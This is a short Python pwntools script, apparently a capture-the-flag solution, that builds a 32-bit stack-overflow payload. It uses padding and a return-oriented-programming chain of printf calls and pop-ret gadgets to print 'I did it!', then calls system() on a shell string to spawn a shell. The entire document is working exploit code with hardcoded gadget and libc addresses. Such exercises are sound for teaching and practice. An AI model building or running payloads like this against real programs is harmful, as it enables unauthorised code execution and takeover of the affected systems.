from pwn import *

padding = 0x12
popret=p32(0x8049022)
pop2ret=p32(0x80492b2)
pop3ret=p32(0x80492b1)
pop4ret=p32(0x80492b0)

printf_func=p32(0x08049040)

formatstr_1=p32(0xf7f593a0)
#I Did it
I=p32(0xf7dcca48)
d=p32(0x8048157)
i=p32(0xf7dcabe4)
t=p32(0xf7dcb558)
space=p32(0xf7dca02a)
excl=p32(0xf7dcb278)
i_did_it_str=[I,I, space, d, i, d, space, i, t, excl]

payload=b''
payload+=b'A' * padding

#adding msg
for msg in i_did_it_str:
    
    payload+=printf_func
    payload+=pop2ret
    payload+=formatstr_1
    payload+=msg




system=p32(0x08049060)
shell=p32(0xf7f59352)
payload+=system 
payload+=popret
payload+=shell
print(payload)